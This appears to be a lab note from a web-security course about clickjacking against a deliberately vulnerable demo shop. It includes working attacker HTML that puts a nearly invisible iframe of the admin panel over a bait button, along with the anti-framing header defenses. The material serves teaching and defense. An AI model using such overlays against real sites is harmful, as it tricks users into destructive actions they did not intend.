# 08 — Clickjacking

## What it is
Clickjacking (UI redressing) is when an attacker loads a page inside a
transparent or hidden iframe on their own site and tricks the victim into
clicking buttons on the embedded page.

Example: the attacker embeds the AquaShop admin dashboard and overlays a
"Claim your free aquarium" button positioned exactly over the "Delete
product" button. The victim clicks the innocent-looking overlay and
actually triggers the destructive action.

## Vulnerability
In VULNERABLE mode, AquaShop sends NO anti-framing headers. Any origin can
embed any page (customer dashboard, admin panel, checkout, etc.) inside
an iframe.

## Attack
Attacker HTML:

    <style>
      iframe {
        position: absolute;
        top: 0; left: 0;
        width: 100vw; height: 100vh;
        opacity: 0.15;
        z-index: 9999;
        border: 0;
      }
      .bait {
        position: absolute;
        top: 50%; left: 50%;
        transform: translate(-50%, -50%);
        z-index: 1;
        padding: 30px 60px;
        background: #ffcc00;
        border-radius: 14px;
        font-size: 28px;
        cursor: pointer;
      }
    </style>

    <button class="bait">Claim your free aquarium!</button>
    <iframe src="http://localhost:8000/admin/products.php"></iframe>

When the user clicks the yellow bait button, the click goes to the
invisible iframe and hits whatever real button is at that coordinate.

## Defense (secure mode)
app/bootstrap.php sends these headers on every response:

    X-Frame-Options: DENY
    Content-Security-Policy: frame-ancestors 'none'

The browser refuses to render the page inside a frame on any other origin.
The hidden iframe stays blank.

X-Frame-Options: DENY        — legacy, widely supported
CSP frame-ancestors 'none'    — modern standard

## Verified
- VULNERABLE: admin panel renders inside an iframe on an attacker page.
- SECURE:     iframe shows a browser "refused to connect" error.

## Quiz 2 relevance
Clickjacking defenses:
- X-Frame-Options: DENY or SAMEORIGIN
- Content-Security-Policy: frame-ancestors 'none' | 'self' | https://example.com
- Frame-busting JS (legacy, unreliable)
